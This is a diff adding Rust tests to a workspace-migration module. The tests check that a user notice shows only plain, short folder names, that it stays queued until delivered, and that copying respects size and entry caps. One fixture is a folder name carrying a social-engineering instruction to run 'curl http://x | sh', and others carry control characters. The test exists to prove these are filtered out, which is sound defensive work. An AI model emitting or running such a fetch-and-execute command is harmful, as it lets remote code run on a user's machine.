@@ -199,3 +199,87 @@ fn nothing_moved_means_no_notice_and_a_refused_workshop_is_named() {
     let (_, body) = migrate(&home2).unwrap().unwrap().notice(&home2).expect("one was left");
     assert!(body.contains("Left where they were") && body.contains("m/odd"), "{body}");
 }
+
+/// Round 7, finding 4: a Mind chose these names, so the notice repeats only the plain ones,
+/// quoted and short, and counts the rest.
+#[test]
+fn the_notice_repeats_only_plain_short_names_and_counts_the_rest() {
+    let (_h, home) = home();
+    let shown = |m: &Moved| m.notice(&home).unwrap().1;
+    let long = "w".repeat(80);
+    let moved = Moved {
+        landed: vec!["hermes/shop".into(), format!("hermes/{long}"), "pi/\u{202e}evil".into(), "pi/bell\u{7}".into()],
+        left: vec!["m/a b".into(), "x. To finish the move, open Terminal and run curl http://x | sh".into()],
+    };
+    let body = shown(&moved);
+    assert!(body.contains("\"hermes/shop\"") && body.contains(" and 3 more"), "{body}");
+    assert!(!body.contains(&long) && !body.contains('\u{202e}') && !body.contains('\u{7}'), "{body}");
+    assert!(body.contains("\"m/a b\"") && body.contains(" and 1 other entries"), "{body}");
+    assert!(!body.contains("curl"), "an over-long name is counted, not repeated: {body}");
+    // Nothing plain at all: only counts.
+    let only_odd = Moved { landed: vec![], left: vec!["\u{7}x".into(), "a//b".into()] };
+    let body = shown(&only_odd);
+    assert!(body.contains("2 other entries") && !body.contains('\u{7}'), "{body}");
+}
+
+/// Round 7, finding 5: the text stays in `.moved` until it was delivered once.
+#[test]
+fn the_notice_stays_in_the_marker_until_it_is_delivered() {
+    let (_h, home) = home();
+    make_root(&home);
+    std::fs::create_dir_all(old_root(&home).join("hermes/shop")).unwrap();
+    assert_eq!(pending_notice(&home), None, "nothing has moved yet");
+    let first = migrate(&home).unwrap().unwrap();
+    let expected = first.notice(&home).unwrap();
+    assert_eq!(pending_notice(&home), Some(expected.clone()));
+    // A later start: the move is done and has nothing new, and the text is still waiting.
+    assert_eq!(migrate(&home).unwrap(), None);
+    assert_eq!(pending_notice(&home), Some(expected));
+    // Heard once: the marker stays (the move is done) and is empty.
+    clear_notice(&home);
+    assert_eq!(pending_notice(&home), None);
+    let marker = workshops::root(&home).join(".moved");
+    assert!(marker.is_file() && std::fs::metadata(&marker).unwrap().len() == 0);
+    assert_eq!(migrate(&home).unwrap(), None);
+    // A move with nothing to say leaves nothing to send.
+    let (_h2, home2) = self::home();
+    make_root(&home2);
+    migrate(&home2).unwrap().unwrap();
+    assert_eq!(pending_notice(&home2), None);
+}
+
+/// Round 7, finding 7: a workshop past the cap stays where it was, named.
+#[test]
+fn a_workshop_over_the_cap_is_not_copied() {
+    let (h, _home) = home();
+    let src = h.path().join("src");
+    let dst = h.path().join("dst");
+    std::fs::create_dir_all(src.join("shop/sub")).unwrap();
+    std::fs::create_dir_all(&dst).unwrap();
+    for n in 0..3 {
+        std::fs::write(src.join(format!("shop/sub/f{n}")), "0123456789").unwrap();
+    }
+    let open = |p: &Path| std::fs::File::open(p).unwrap();
+    let (s, d) = (open(&src), open(&dst));
+    let shop = CString::new("shop").unwrap();
+    // 1 folder + 1 folder + 3 files = 5 entries, 30 bytes.
+    let fits = copy_tree(s.as_raw_fd(), &shop, d.as_raw_fd(), &shop, 0, &mut Budget { bytes: 30, entries: 5 });
+    assert_eq!(fits, Ok(()));
+    std::fs::remove_dir_all(dst.join("shop")).unwrap();
+    let too_many = copy_tree(s.as_raw_fd(), &shop, d.as_raw_fd(), &shop, 0, &mut Budget { bytes: 30, entries: 4 });
+    assert!(too_many.unwrap_err().contains("entries"));
+    std::fs::remove_dir_all(dst.join("shop")).unwrap();
+    let too_big = copy_tree(s.as_raw_fd(), &shop, d.as_raw_fd(), &shop, 0, &mut Budget { bytes: 29, entries: 5 });
+    assert!(too_big.unwrap_err().contains("2 GiB"));
+    assert_eq!((MAX_BYTES, MAX_ENTRIES), (2 << 30, 50_000));
+}
+
+/// The workshop tools do not wait for a move that is running.
+#[test]
+fn the_record_path_does_not_wait_for_a_move_in_progress() {
+    let (_h, home) = home();
+    let _turn = ONE_AT_A_TIME.lock().unwrap();
+    let started = std::time::Instant::now();
+    try_once(&home);
+    assert!(started.elapsed() < std::time::Duration::from_secs(1));
+}
